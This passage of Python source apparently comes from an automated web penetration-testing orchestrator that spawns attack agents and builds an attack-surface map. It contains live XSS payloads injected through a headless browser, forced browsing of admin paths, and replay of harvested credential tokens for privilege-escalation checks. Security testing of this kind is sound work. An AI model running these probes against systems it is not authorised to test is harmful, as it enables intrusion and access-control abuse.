                            executor = self.executor_registry.get(tid)
                            if not executor:
                                continue
                            try:
                                exp = SecurityExperiment(
                                    hypothesis_id=f"fallback_{tid}",
                                    endpoint_id=base_url,
                                    capability=tid.split("_")[0],
                                    test_id=tid,
                                    input_parameters={
                                        "url": base_url,
                                        "endpoints": ep_list,
                                        "auth_token": auth_token,
                                    },
                                )
                                result = executor.execute(exp)
                                fallback_ran += 1

                                # Convert executor evidence to vulnerabilities
                                if result.evidence:
                                    self._ingest_executor_findings(tid, base_url, result.evidence)
                            except Exception as ex:
                                logger.debug(f"[FallbackSweep] Test {tid} failed: {ex}")

                        logger.info(f"[FallbackSweep] Executed {fallback_ran} deterministic tests")
                        self.failure_streak = 0
                        agents_this_phase += 1
                        break
                    except Exception as ex:
                        logger.error(f"Fallback catalog sweep failed: {ex}")
                        break
                continue

            # ── Canonical Planner Response Normalization ──
            if canonical_decision is None:
                try:
                    canonical_decision = PlannerResponseNormalizer.normalize(decision)
                except Exception as e:
                    self.failure_streak += 1
                    logger.error(f"Planner decision normalization failed: {e}")
                    continue

            self.failure_streak = 0
            action = canonical_decision.action

            if action == BrainDecisionAction.COMPLETE:
                logger.info(f"✓ Phase '{phase}' complete")
                break

            # ── Schedule & Spawn Tasks Managed by TaskManager ──
            if action in (BrainDecisionAction.SPAWN_AGENTS, BrainDecisionAction.SPAWN_TASKS):
                task_specs = canonical_decision.tasks
                # Validate upstream proof before spawning auth / downstream exploit tasks
                validated_specs = []
                for spec in task_specs:
                    cap_val = spec.capability.value.lower()
                    obj_val = spec.objective.lower()
                    
                    if cap_val == "authentication_testing" or "auth" in obj_val or "login" in obj_val:
                        creds = getattr(self.ctx, "harvested_creds", []) or getattr(self.ctx, "extracted_credentials", []) or getattr(self.ctx, "leaked_credentials", [])
                        if not creds:
                            has_extracted = getattr(self.ctx, "has_run_data_extraction", False)
                            if not has_extracted:
                                logger.info(f"CREDENTIAL_EXTRACTION_REQUIRED: Scheduling data & credential extraction before auth testing for objective='{spec.objective}'")
                                self.ctx.update("has_run_data_extraction", True)
                                spec.capability = CapabilityType.ENDPOINT_DISCOVERY
                                spec.objective = f"Discover API endpoints and extract leaked credentials or tokens for {self.ctx.target}"
                            else:
                                logger.info(f"NO_EXTRACTED_CREDENTIALS_FALLBACK: Data extraction complete (0 creds found). Proceeding with default/anonymous auth testing for '{spec.objective}'")
                        else:
                            sample = creds[0].get("username") or creds[0].get("secret") or "user"
                            logger.info(f"CREDENTIALS_AVAILABLE: count={len(creds)}, sample_user='{sample}'")
                            
                    elif cap_val in ("rce", "idor", "privilege_escalation") or "rce" in obj_val or "idor" in obj_val:
                        token = getattr(self.ctx, "auth_token", None)
                        vulns = getattr(self.ctx, "vulnerabilities", [])
                        requests_cap = getattr(self.ctx, "captured_requests", [])
                        if not token and not vulns and not requests_cap and not getattr(self.ctx, "has_run_data_extraction", False):
                            logger.warning(f"[WARN] NO_UPSTREAM_PROOF: postponing downstream exploit '{spec.objective}' until recon/auth completes")
                            continue
                            
                    validated_specs.append(spec)

                task_specs = validated_specs
                if not task_specs:
                    logger.warning("All proposed tasks filtered out due to missing upstream proof/credentials")
                    self.consecutive_agent_failures += 1
                    continue

                # ── Schedule tasks into DAG Scheduler ──
                try:
                    self.scheduler.schedule_tasks(task_specs)
                except Exception as e:
                    logger.error(f"[CentralBrain] Scheduling failed: {e}")
                    self.consecutive_agent_failures += 1
                    continue

                # ── Execute tasks stage-by-stage respecting dependencies ──
                stage_count = 0
                has_executed_any = False
                phase_should_exit = False

                while True:
                    runnable_tasks = self.scheduler.get_next_runnable_tasks()
                    if not runnable_tasks:
                        if stage_count == 0 and not has_executed_any:
                            # All scheduled tasks were already completed or duplicates
                            for spec in task_specs:
                                if spec.objective:
                                    completed_objectives.add(spec.objective.lower().strip())
                            self.consecutive_agent_failures += 1
                            if self.consecutive_agent_failures >= 2:
                                logger.info(f"Phase '{phase}' completed via task deduplication limit.")
                                phase_should_exit = True
                        break

                    stage_count += 1
                    spawn_specs = []
                    for task in runnable_tasks:
                        self.task_manager.start_task(task.spec.task_id)
                        s_dict = {
                            "objective": task.spec.objective,
                            "capability": task.spec.capability.value,
                            "target": task.spec.inputs.get("target", self.ctx.target),
                            "tools": task.spec.inputs.get("tools", []),
                            "max_steps": task.spec.max_steps,
                            "task_id": task.spec.task_id
                        }
                        spawn_specs.append((task, s_dict))

                    valid_specs_and_agents = []
                    for task, s_dict in spawn_specs:
                        agent_inst = self.spawner.spawn(s_dict)
                        if agent_inst is None:
                            logger.info(f"TASK_SKIPPED_OR_DEDUPLICATED: task_id={task.spec.task_id} objective='{task.spec.objective}'")
                            self.task_manager.complete_task(task.spec.task_id, {"status": "skipped", "reason": "Deduplicated or skipped by spawner"})
                        else:
                            valid_specs_and_agents.append((task, s_dict, agent_inst))

                    if not valid_specs_and_agents:
                        logger.info("[Scheduler] No new valid/non-duplicate agents to execute in this stage. Advancing phase.")
                        for task, s_dict in spawn_specs:
                            obj = task.spec.objective
                            if obj:
                                completed_objectives.add(obj.lower().strip())
                        self.consecutive_agent_failures += 1
                        if self.consecutive_agent_failures >= 2:
                            logger.info(f"Phase '{phase}' completed via task deduplication limit.")
                            phase_should_exit = True
                        break

                    has_executed_any = True

                    spawn_specs = [(t, s) for t, s, a in valid_specs_and_agents]
                    agents = [a for t, s, a in valid_specs_and_agents]
                    logger.info(f"[Scheduler] Executing {len(agents)} READY tasks in parallel stage")

                    max_task_duration = float(getattr(getattr(self, "config", None), "max_task_duration", 300.0) or 300.0)

                    async def _run_agent_with_timeout(agent_inst):
                        try:
                            return await asyncio.wait_for(agent_inst.execute(), timeout=max_task_duration)
                        except (asyncio.TimeoutError, TimeoutError):
                            agent_id_str = getattr(agent_inst, 'agent_id', 'AGENT')
                            logger.warning(f"TASK_TIMEOUT: agent_id={agent_id_str} duration={max_task_duration}s, killing process")
                            return {"status": "timeout", "reason": f"Task exceeded max duration ({max_task_duration}s)"}

                    results = await asyncio.gather(*[_run_agent_with_timeout(a) for a in agents], return_exceptions=True)

                    for i, result in enumerate(results):
                        task, s_dict = spawn_specs[i]
                        agent = agents[i]
                        obj = task.spec.objective
                        completed_objectives.add(obj.lower().strip())
                        
                        entry = {
                            "agent_id": getattr(agent, 'agent_id', f'AGENT-{agents_this_phase+1}'),
                            "objective": obj,
                            "success": False,
                            "findings": "",
                            "failed_tools": [],
                        }
                        
                        if isinstance(result, dict) and result.get("status") == "timeout":
                            logger.warning(f"TASK_TIMEOUT: task_id={task.spec.task_id} duration={max_task_duration}s, status=TIMEOUT")
                            self.task_manager.timeout_task(task.spec.task_id)
                            self.consecutive_agent_failures += 1
                            entry["findings"] = result.get("reason", "Task exceeded max duration")
                        elif isinstance(result, Exception):
                            logger.error(f"Task {task.spec.task_id} crashed: {result}")
                            self.task_manager.fail_task(task.spec.task_id, str(result))
                            self.consecutive_agent_failures += 1
                            entry["findings"] = f"Crashed: {result}"
                        elif isinstance(result, dict) and result.get("status") == "failed":
                            logger.warning(f"Task {task.spec.task_id} failed: {result.get('reason')}")
                            self.task_manager.fail_task(task.spec.task_id, result.get("reason", "failed"))
                            self.consecutive_agent_failures += 1
                            entry["findings"] = f"Failed: {result.get('reason')}"
                        else:
                            self.consecutive_agent_failures = 0
                            entry["success"] = True
                            entry["findings"] = str(result.get("results", "") if isinstance(result, dict) else result)[:200]
                            self.task_manager.complete_task(task.spec.task_id, result if isinstance(result, dict) else {})
                            logger.info(f"✓ Task {task.spec.task_id} SUCCEEDED")

                        # Track metrics
                        self.metrics.record_event("agent", entry["agent_id"],
                                                  entry["success"], entry["findings"])

                        # Strix Pattern #2+3: Record coverage + classify errors for legacy path
                        try:
                            from core.coverage.coverage_tracker import TestAttempt, TestOutcome, FailureReason
                            _outcome = TestOutcome.CONFIRMED if entry["success"] else TestOutcome.NEEDS_FOLLOW_UP
                            _failure = FailureReason.NONE
                            if not entry["success"]:
                                if isinstance(result, dict) and result.get("status") == "timeout":
                                    _failure = FailureReason.TIMEOUT
                                elif isinstance(result, Exception):
                                    classified = self.error_classifier.classify(
                                        exception=result if isinstance(result, Exception) else None,
                                        stderr=str(entry.get("findings", ""))[:500],
                                    )
                                    _failure = {
                                        "rate_limited": FailureReason.RATE_LIMITED,
                                        "waf_blocked": FailureReason.WAF_BLOCKED,
                                        "auth_failed": FailureReason.AUTH_FAILED,
                                        "timeout": FailureReason.TIMEOUT,
                                        "not_found": FailureReason.ENDPOINT_NOT_FOUND,
                                    }.get(classified.category.value, FailureReason.UNKNOWN)
                                else:
                                    _failure = FailureReason.UNKNOWN
                            self.coverage_tracker.record(TestAttempt(
                                test_id=task.spec.task_id,
                                category=task.spec.capability.value,
                                endpoint=task.spec.inputs.get("target", self.ctx.target),
                                parameter="",
                                payload=task.spec.objective[:200],
                                outcome=_outcome,
                                failure_reason=_failure,
                                tool_name=entry["agent_id"],
                            ))
                        except Exception:
                            pass

                    # Aggregate wave results into shared context and persistent database
                    self._aggregate_wave_results(agents, results)

                    # Process dependencies to unlock newly ready tasks
                    self.scheduler.process_dependencies()
                    agent_history.append(entry)
                    agents_this_phase += len(runnable_tasks)

                if phase_should_exit:
                    break

            # ── Spawn SINGLE agent ──
            elif action == "spawn_agent":
                spec = decision.get("agent_spec", {})
                obj = spec.get("objective", "")
                if not obj:
                    continue
                
                # Check duplicate
                if obj.lower().strip() in completed_objectives:
                    logger.info(f"Skipping duplicate objective: {obj}")
                    self.consecutive_agent_failures += 1
                    continue
                
                # Strip failed tools
                spec["tools"] = [t for t in spec.get("tools", []) if t not in self.failed_tools]
                if not spec["tools"]:
                    logger.warning(f"Skipping agent - all tools unavailable: {obj}")
                    self.consecutive_agent_failures += 1
                    continue

                agent = self.spawner.spawn(spec)
                result = await agent.execute()
                agents_this_phase += 1
                completed_objectives.add(obj.lower().strip())

                entry = {
                    "agent_id": getattr(agent, 'agent_id', f'AGENT-{agents_this_phase}'),
                    "objective": obj,
                    "success": False,
                    "findings": "",
                    "failed_tools": [],
                }

                if result.get("status") == "failed":
                    self.consecutive_agent_failures += 1
                    logger.warning(f"Agent failed: {result.get('reason')}")
                    entry["findings"] = f"Failed: {result.get('reason')}"
                else:
                    self.consecutive_agent_failures = 0
                    entry["success"] = True
                    entry["findings"] = str(result.get("results", ""))[:200]
                
                # Learn failed tools
                if hasattr(agent, 'failed_tools'):
                    entry["failed_tools"] = list(agent.failed_tools)
                    for failed_tool in agent.failed_tools:
                        self.failed_tools.add(failed_tool)
                        logger.warning(f"Brain learned: '{failed_tool}' is unavailable")

                self.metrics.record_event("agent", entry["agent_id"],
                                          entry["success"], entry["findings"])
                agent_history.append(entry)

        # ── End of phase: update metrics + evaluate automation rules ──
        self.metrics.incr("vuln_total", 0)  # ensure counter exists
        self.metrics.counters["vuln_total"] = len(self.ctx.vulnerabilities)
        try:
            self.metrics.write_dashboard()
            self.metrics.write_json()
        except Exception as e:      # noqa: BLE001
            logger.debug(f"[Metrics] dashboard write failed: {e}")
        for act in self.automation.evaluate():
            logger.info(f"Automation recommends: {act['action']} ({act['rule']})")
    
    def _feed_recon_to_attack_surface_state(self):
        surface = getattr(self.ctx, 'attack_surface', None)
        if not surface:
            logger.debug("[ReconV2Wire] No AttackSurfaceState on ctx, skipping")
            return

        fed = {"assets": 0, "endpoints": 0, "technologies": 0, "parameters": 0}

        # Subdomains → assets
        for sub in getattr(self.ctx, 'subdomains', []) or []:
            if isinstance(sub, str) and sub.strip():
                surface.add_asset(sub.strip(), "subdomain", {"hostname": sub.strip()},
                                  source="recon_pipeline")
                fed["assets"] += 1

        # IPs → assets
        for ip in getattr(self.ctx, 'ips', []) or []:
            if isinstance(ip, str) and ip.strip():
                surface.add_asset(ip.strip(), "ip", {"address": ip.strip()},
                                  source="recon_pipeline")
                fed["assets"] += 1

        # Technologies → technologies
        for host, techs in (getattr(self.ctx, 'technologies', {}) or {}).items():
            if isinstance(techs, bool) or techs is None:
                continue
            for tech in (techs if isinstance(techs, list) else [techs]):
                try:
                    if isinstance(tech, dict):
                        from core.domain.asset import Technology as TechObj
                        t = TechObj(name=tech.get("name", ""), version=tech.get("version", ""),
                                    source="recon_pipeline")
                        surface.add_technology(host, t)
                    elif isinstance(tech, str):
                        from core.domain.asset import Technology as TechObj
                        surface.add_technology(host, TechObj(name=tech, source="recon_pipeline"))
                    else:
                        continue
                    fed["technologies"] += 1
                except Exception:
                    pass

        # Endpoints → endpoints
        from core.domain.endpoint import Endpoint as EPObj
        from core.domain.parameter import Parameter as ParamObj
        from urllib.parse import urlparse
        ep_errors = 0
        for ep_data in getattr(self.ctx, 'endpoints', []) or []:
            try:
                if isinstance(ep_data, dict):
                    url = ep_data.get("url", ep_data.get("path", ""))
                    method = ep_data.get("method", "GET").upper()
                elif isinstance(ep_data, str):
                    url = ep_data
                    method = "GET"
                else:
                    continue
                if not url:
                    continue

                parsed = urlparse(url if "://" in url else f"https://{url}")
                path = parsed.path or "/"
                host = parsed.hostname or self.ctx.target if hasattr(self.ctx, 'target') else ""
                scheme = parsed.scheme or "https"
                port = parsed.port or (443 if scheme == "https" else 80)

                ep = EPObj(
                    endpoint_id="",
                    url=url,
                    path=path,
                    method_set=[method],
                    host=host,
                    scheme=scheme,
                    port=port,
                    source="recon_pipeline",
                )
                # P0.1: one canonical, content-addressed identity across every
                # store — a random uuid made the same URL "new" here but a
                # "duplicate" elsewhere, which drove transferred_to_v2 to 1-3.
                try:
                    ep.endpoint_id = ep.canonical_id()
                except Exception:
                    ep.endpoint_id = ep.normalized_key()
                if surface.add_endpoint(ep, source="recon_pipeline"):
                    fed["endpoints"] += 1

                    # Parameters for this endpoint
                    params = ep_data.get("params", []) if isinstance(ep_data, dict) else []
                    for p in params:
                        try:
                            if isinstance(p, dict):
                                param = ParamObj(name=p.get("name", ""), parameter_type=p.get("type", "query"))
                            elif isinstance(p, str):
                                param = ParamObj(name=p, parameter_type="query")
                            else:
                                continue
                            surface.add_parameter(ep.endpoint_id, param, source="recon_pipeline")
                            fed["parameters"] += 1
                        except Exception as pe:
                            logger.debug(f"[ReconV2Wire] Parameter add failed: {pe}")
            except Exception as ep_err:
                ep_errors += 1
                if ep_errors <= 3:
                    logger.warning(f"[ReconV2Wire] Endpoint construction failed: {ep_err}")
        if ep_errors > 3:
            logger.warning(f"[ReconV2Wire] {ep_errors} total endpoint construction failures")

        # Phase 5: Wire redirects from subdomain_status into AttackSurfaceState
        subdomain_status = getattr(self.ctx, 'subdomain_status', {}) or {}
        for host, info in subdomain_status.items():
            if isinstance(info, dict):
                redirect_url = info.get("url", "")
                if redirect_url and host and redirect_url != f"https://{host}" and redirect_url != f"http://{host}":
                    from urllib.parse import urlparse as _up
                    redirect_host = _up(redirect_url).netloc
                    if redirect_host and redirect_host != host:
                        surface.add_redirect(host, redirect_host)

        # Phase 5: Wire related applications (e.g., API subdomains as related apps)
        target = self.ctx.target if hasattr(self.ctx, 'target') else ""
        api_subs = [s for s in getattr(self.ctx, 'subdomains', []) or []
                    if isinstance(s, str) and any(kw in s.lower() for kw in ("api.", "admin.", "staging.", "dev.", "app."))]
        for sub in api_subs:
            surface.add_related_application(target, sub)

        # Mark transferred counts for Phase 4 tracking
        if fed["endpoints"] > 0 or fed["parameters"] > 0:
            surface.mark_transferred_to_v2(fed["endpoints"], fed["parameters"])

        surface.log_transfer_counts()
        logger.info(f"[ReconV2Wire] Fed to AttackSurfaceState: "
                    f"assets={fed['assets']} endpoints={fed['endpoints']} "
                    f"technologies={fed['technologies']} parameters={fed['parameters']}")

    async def _classify_subdomains(self):
        subs = getattr(self.ctx, "subdomains", []) or []
        if not subs:
            return
        import httpx
        from urllib.parse import urlparse

        hosts = []
        for s in subs:
            h = s.strip().lower().rstrip(".")
            if "://" in h:
                h = urlparse(h).hostname or h
            if h:
                hosts.append(h)
        hosts = sorted(set(hosts))

        async def _probe(host):
            for url in (f"https://{host}", f"http://{host}"):
                try:
                    async with httpx.AsyncClient(verify=False, timeout=10, follow_redirects=True) as c:
                        r = await c.get(url, headers={"User-Agent": "Mozilla/5.0"})
                        final = urlparse(str(r.url)).hostname or host
                        note = "" if final == host else f"redirects to {final}"
                        return host, {"live": True, "status_code": r.status_code,
                                      "url": url, "note": note, "len": len(r.content or b"")}
                except Exception:
                    continue
            return host, {"live": False, "status_code": 0, "url": f"https://{host}",
                          "note": "no response", "len": 0}

        results = await asyncio.gather(*(_probe(h) for h in hosts), return_exceptions=True)
        status = {}
        for res in results:
            if isinstance(res, tuple):
                status[res[0]] = res[1]
        self.ctx.subdomain_status = status
        live_n = sum(1 for v in status.values() if v.get("live"))
        logger.info(f"[SubdomainClassify] {live_n}/{len(status)} subdomains live")

    # Static asset extensions that are not useful test targets.
    _STATIC_EXT = {
        ".js", ".mjs", ".css", ".map", ".png", ".jpg", ".jpeg", ".gif", ".svg",
        ".ico", ".webp", ".avif", ".bmp", ".woff", ".woff2", ".ttf", ".otf", ".eot",
        ".mp4", ".mp3", ".webm", ".ogg", ".wav", ".pdf", ".zip", ".gz", ".tar",
    }

    def _preflight_endpoint_analysis(self):
        from urllib.parse import urlparse

        def _classify(path: str) -> str:
            p = path.lower()
            if any(seg in p for seg in ("/api/", "/rest/", "/graphql", "/v1/", "/v2/")):
                return "api"
            if any(seg in p for seg in ("login", "admin", "upload", "account", "user",
                                        "token", "password", "auth", "checkout", "cart", "order")):
                return "sensitive"
            if "?" in path or "=" in path:
                return "parameterized"
            return "page"

        catalog = {}
        sources = []

        # 1) captured requests (real observed traffic)
        for r in getattr(self.ctx, "captured_requests", []) or []:
            url = getattr(r, "url", None) or (r.get("url") if isinstance(r, dict) else None)
            method = getattr(r, "method", None) or (r.get("method") if isinstance(r, dict) else "GET")
            if url:
                sources.append((str(method or "GET").upper(), str(url)))
        # 2) discovered endpoints (Endpoint objects or dicts)
        eps = getattr(self.ctx, "endpoints", {}) or {}
        ep_iter = eps.values() if isinstance(eps, dict) else eps
        for ep in ep_iter:
            url = getattr(ep, "url", None) or (ep.get("url") or ep.get("name") if isinstance(ep, dict) else None)
            if url:
                sources.append(("GET", str(url)))
        # 3) finding locations
        for v in getattr(self.ctx, "vulnerabilities", []) or []:
            loc = v.get("location") or v.get("url") if isinstance(v, dict) else None
            if loc and str(loc).startswith("http"):
                sources.append((str(v.get("method", "GET")).upper(), str(loc)))

        for method, url in sources:
            try:
                pu = urlparse(url if "://" in url else f"https://{url}")
                path = pu.path or "/"
                # drop static assets
                ext = "." + path.rsplit(".", 1)[-1].lower() if "." in path.rsplit("/", 1)[-1] else ""
                if ext in self._STATIC_EXT:
                    continue
                key = f"{method} {pu.netloc}{path}"
                if key in catalog:
                    continue
                catalog[key] = {
                    "url": f"{pu.scheme}://{pu.netloc}{path}" + (f"?{pu.query}" if pu.query else ""),
                    "path": path + (f"?{pu.query}" if pu.query else ""),
                    "method": method,
                    "host": pu.netloc,
                    "kind": _classify(path + ("?" + pu.query if pu.query else "")),
                }
            except Exception:
                continue

        # Rank: api/sensitive/parameterized first (most testable), pages last.
        order = {"api": 0, "sensitive": 1, "parameterized": 2, "page": 3}
        result = sorted(catalog.values(), key=lambda e: order.get(e["kind"], 9))
        self.ctx.endpoint_catalog = result
        logger.info(f"[Preflight] Endpoint catalog: {len(result)} useful endpoints "
                    f"(filtered static assets) from {len(sources)} raw URLs")
        return result

    def _feed_catalog_to_attack_surface(self):
        from urllib.parse import urlparse, parse_qs
        from core.domain.endpoint import Endpoint
        from core.domain.parameter import Parameter, ParameterType

        catalog = getattr(self.ctx, "endpoint_catalog", []) or []
        added = 0
        for entry in catalog:
            url = entry.get("url", "")
            method = entry.get("method", "GET")
            path = entry.get("path", "/")
            if not url:
                continue
            pu = urlparse(url)
            eid = f"{method}:{pu.netloc}{pu.path}"
            # skip if already in the graph
            if eid in self.attack_surface.endpoints:
                continue
            # extract parameters from query string
            params = []
            qs = parse_qs(pu.query, keep_blank_values=True)
            for pname in qs:
                params.append(Parameter(
                    name=pname,
                    parameter_type=ParameterType.QUERY,
                    inferred_data_type="string",
                    is_required=False,
                ))
            # for POST/PUT/PATCH, add a generic body param so injection matrix tests it
            if method in ("POST", "PUT", "PATCH") and not any(
                    p.parameter_type == ParameterType.BODY for p in params):
                params.append(Parameter(
                    name="body",
                    parameter_type=ParameterType.BODY,
                    inferred_data_type="string",
                    is_required=False,
                ))
            try:
                ep = Endpoint(
                    endpoint_id=eid,
                    url=url,
                    path=pu.path or "/",
                    method_set=[method],
                    parameters=params,
                    auth_required=entry.get("kind") == "sensitive",
                )
                self.attack_surface.add_endpoint(ep)
                # Also register each parameter into the graph's parameter inventory
                # so the InjectionMatrix / param-fuzz path can actually enumerate
                # them (without this, parameters=0 despite thousands of endpoints).
                try:
                    for _p in params:
                        self.attack_surface.add_parameter(eid, _p)
                except Exception:
                    pass
                added += 1
            except Exception:
                continue
        if added:
            try:
                self.attack_surface.build_graph()
            except Exception:
                pass
            logger.info(f"[Preflight→AttackSurface] Fed {added} catalog endpoints "
                        f"(with params) into attack surface graph")

    def _hydrate_attack_surface_from_ctx_endpoints(self):
        from urllib.parse import urlparse, parse_qs
        from core.domain.endpoint import Endpoint
        from core.domain.parameter import Parameter, ParameterType

        raw_endpoints = getattr(self.ctx, "endpoints", []) or []
        added = 0
        for entry in raw_endpoints:
            if isinstance(entry, str):
                url = entry
                method = "GET"
            elif isinstance(entry, dict):
                url = entry.get("url") or entry.get("path") or ""
                method = entry.get("method", "GET")
            else:
                continue
            if not url:
                continue
            if not url.startswith("http"):
                url = f"https://{url}"
            pu = urlparse(url)
            eid = f"{method}:{pu.netloc}{pu.path}"
            if eid in self.attack_surface.endpoints:
                continue
            params = []
            qs = parse_qs(pu.query, keep_blank_values=True)
            for pname in qs:
                params.append(Parameter(
                    name=pname,
                    parameter_type=ParameterType.QUERY,
                    inferred_data_type="string",
                    is_required=False,
                ))
            if method in ("POST", "PUT", "PATCH") and not any(
                    p.parameter_type == ParameterType.BODY for p in params):
                params.append(Parameter(
                    name="body",
                    parameter_type=ParameterType.BODY,
                    inferred_data_type="string",
                    is_required=False,
                ))
            try:
                ep = Endpoint(
                    endpoint_id=eid,
                    url=url,
                    path=pu.path or "/",
                    method_set=[method],
                    parameters=params,
                )
                self.attack_surface.add_endpoint(ep)
                # Also register each parameter into the graph's parameter inventory
                # so the InjectionMatrix / param-fuzz path can actually enumerate
                # them (without this, parameters=0 despite thousands of endpoints).
                try:
                    for _p in params:
                        self.attack_surface.add_parameter(eid, _p)
                except Exception:
                    pass
                added += 1
            except Exception:
                continue
        if added:
            try:
                self.attack_surface.build_graph()
            except Exception:
                pass
            logger.info(f"[ctx→AttackSurface] Fed {added} discovered endpoints into attack surface graph")

    async def _browser_xss_validation(self):
        from core.actuation.browser_actuator import BrowserActuator
        browser = BrowserActuator()
        target = self.ctx.target.rstrip("/")

        # Collect endpoints with query parameters for DOM XSS probing
        test_urls = []
        for ep in (getattr(self.ctx, "endpoints", []) or []):
            url = ep if isinstance(ep, str) else (ep.get("url", "") if isinstance(ep, dict) else "")
            if url and "?" in url:
                test_urls.append(url)
        # Also add common search/query endpoints discovered or generic
        search_paths = ["/search", "/#/search"]
        for ep in (getattr(self.ctx, "endpoints", []) or []):
            ep_url = ep if isinstance(ep, str) else (ep.get("url", "") if isinstance(ep, dict) else "")
            if ep_url and any(k in ep_url.lower() for k in ["search", "query", "find", "lookup"]):
                search_paths.append(ep_url if ep_url.startswith("/") else f"/{ep_url.lstrip('/')}")
        for path in search_paths[:10]:
            test_urls.append(f"{target}{path}?q=<script>alert('xss')</script>")

        xss_probe = "<img src=x onerror=window.__xss_proof__=1>"
        findings = []

        for url in test_urls[:15]:
            if "?" in url:
                param_url = url.split("?")[0] + "?" + "&".join(
                    f"{p.split('=')[0]}={xss_probe}" for p in url.split("?")[1].split("&")
                )
            else:
                param_url = f"{url}?q={xss_probe}"

            try:
                result = await browser.run_actions([
                    {"action": "navigate", "url": param_url, "timeout": 15000},
                    {"action": "eval", "script": "!!window.__xss_proof__"},
                    {"action": "dom"},
                ])
                if result.get("error"):
                    continue
                results = result.get("results", [])
                console_logs = result.get("console", [])

                xss_fired = results[0] if results else False
                dom_content = results[1] if len(results) > 1 else ""
                js_errors = [l for l in console_logs if "xss" in l.lower() or "error" in l.lower()]

                if xss_fired:
                    findings.append({
                        "title": f"DOM XSS Confirmed: {param_url.split('?')[0]}",
                        "type": "XSS",
                        "severity": "HIGH",
                        "location": param_url,
                        "target": param_url,
                        "details": "DOM-based XSS confirmed via Playwright browser execution. "
                                   "Injected payload executed JavaScript in the page context.",
                        "proof": f"window.__xss_proof__ = true after injection. Console: {js_errors[:3]}",
                        "tool": "playwright_browser",
                        "confirmed": True,
                        "exploited": True,
                        "cwe_id": "CWE-79",
                    })
                elif xss_probe in str(dom_content):
                    findings.append({
                        "title": f"Reflected XSS (unescaped): {param_url.split('?')[0]}",
                        "type": "XSS",
                        "severity": "MEDIUM",
                        "location": param_url,
                        "target": param_url,
                        "details": "Input reflected unescaped in DOM but JS execution not confirmed.",
                        "proof": f"Payload found in DOM content",
                        "tool": "playwright_browser",
                        "cwe_id": "CWE-79",
                    })
            except Exception as e:
                logger.debug(f"[BrowserXSS] Error testing {url}: {e}")
                continue

        # Also check for clickjacking (missing X-Frame-Options)
        try:
            result = await browser.run_actions([
                {"action": "navigate", "url": target, "timeout": 15000},
                {"action": "eval", "script": (
                    "(() => {"
                    "  const iframe = document.createElement('iframe');"
                    "  iframe.src = window.location.href;"
                    "  iframe.style.display = 'none';"
                    "  document.body.appendChild(iframe);"
                    "  return !!(iframe.contentDocument || iframe.contentWindow);"
                    "})()"
                )},
            ])
            if result.get("results", [None])[0]:
                findings.append({
                    "title": "Clickjacking: Page frameable",
                    "type": "CLICKJACKING",
                    "severity": "MEDIUM",
                    "location": target,
                    "target": target,
                    "details": "Page can be embedded in an iframe (no X-Frame-Options / CSP frame-ancestors).",
                    "proof": "Successfully loaded page in iframe via Playwright",
                    "tool": "playwright_browser",
                    "cwe_id": "CWE-1021",
                })
        except Exception:
            pass

        for f in findings:
            self.ctx.add_vulnerability(f)
        if findings:
            logger.info(f"[BrowserXSS] Playwright found {len(findings)} client-side issues")
        else:
            logger.info("[BrowserXSS] No DOM XSS or clickjacking found via browser")

    async def _probe_web_privilege_escalation(self):
        from agents.kali_executor import KaliDockerExecutor
        target = self.ctx.target.rstrip("/")
        admin_paths = [
            "/admin", "/administration", "/api/admin",
            "/admin/dashboard", "/panel", "/manage", "/console",
            "/api/v1/admin", "/admin/users", "/api/admin/users",
        ]
        # Add admin/sensitive paths from discovered endpoints
        for ep in (getattr(self.ctx, "endpoints", []) or []):
            ep_url = ep if isinstance(ep, str) else (ep.get("url", "") if isinstance(ep, dict) else "")
            if ep_url and any(k in ep_url.lower() for k in ["admin", "manage", "dashboard", "panel",
                                                              "internal", "config", "users", "staff"]):
                path = ep_url if ep_url.startswith("/") else f"/{ep_url.lstrip('/')}"
                if path not in admin_paths:
                    admin_paths.append(path)
        findings = []
        for path in admin_paths:
            url = f"{target}{path}"
            cmd = f'curl -s -o /dev/null -w "%{{http_code}}" -k --max-time 10 "{url}"'
            result = KaliDockerExecutor.run(cmd, timeout=15)
            if result.get("status") != "success":
                continue
            try:
                status = int(result.get("stdout", "").strip())
            except (ValueError, IndexError):
                continue
            if status in (200, 301, 302):
                findings.append({
                    "title": f"Admin Endpoint Accessible: {path}",
                    "type": "FORCED_BROWSING",
                    "severity": "HIGH" if status == 200 else "MEDIUM",
                    "location": url,
                    "target": url,
                    "details": f"Admin path {path} returned HTTP {status} without authentication.",
                    "proof": f"HTTP {status} at {url}",
                    "tool": "privesc_probe",
                    "cwe_id": "CWE-425",
                })

        # If we have harvested creds (regular user), try accessing admin paths WITH auth
        creds = getattr(self.ctx, "harvested_creds", []) or []
        if creds:
            cred = creds[0]
            token = cred.get("session_token", "")
            if token:
                for path in ["/api/admin", "/rest/admin", "/administration", "/api/Users"]:
                    url = f"{target}{path}"
                    cmd = (
                        f'curl -s -o /dev/null -w "%{{http_code}}" -k --max-time 10 '
                        f'-H "Authorization: Bearer {token}" "{url}"'
                    )
                    result = KaliDockerExecutor.run(cmd, timeout=15)
                    if result.get("status") != "success":
                        continue
                    try:
                        status = int(result.get("stdout", "").strip())
                    except (ValueError, IndexError):
                        continue
                    if status == 200:
                        findings.append({
                            "title": f"Privilege Escalation: Regular user accesses {path}",
                            "type": "PRIVILEGE_ESCALATION",
                            "severity": "CRITICAL",
                            "location": url,
                            "target": url,
                            "details": (
                                f"Regular user '{cred.get('username', '')}' can access admin "
                                f"endpoint {path}. This indicates broken access control."
                            ),
                            "proof": f"HTTP 200 at {url} with regular user token",
                            "tool": "privesc_probe",
                            "cwe_id": "CWE-269",
                            "confirmed": True,
                        })

        for f in findings:
            self.ctx.add_vulnerability(f)
        if findings:
            logger.info(f"[WebPrivesc] Found {len(findings)} privilege escalation / forced browsing issues")
        else:
            logger.info("[WebPrivesc] No forced browsing or privilege escalation found")

    async def _reprobe_sleeping_hosts(self, dead_urls: list, attempts: int = 4,
                                        base_delay: int = 15) -> list:
        import httpx as _httpx
        import asyncio as _aio
        recovered = []
        if not dead_urls:
            return recovered
        logger.info(f"[Reprobe] Attempting to wake {len(dead_urls)} 503/dead host(s)")
        for attempt in range(attempts):
            await _aio.sleep(base_delay * (attempt + 1))  # 15s, 30s, 45s, 60s
            still_dead = []
            async with _httpx.AsyncClient(follow_redirects=True, timeout=20, verify=False) as client:
                for url in dead_urls:
                    try:
                        r = await client.get(url)
                        if r.status_code < 500:
                            recovered.append({"url": url, "status": r.status_code, "live": True})
                            logger.info(f"[Reprobe] {url} woke up -> HTTP {r.status_code}")
                        else:
                            still_dead.append(url)
                    except Exception:
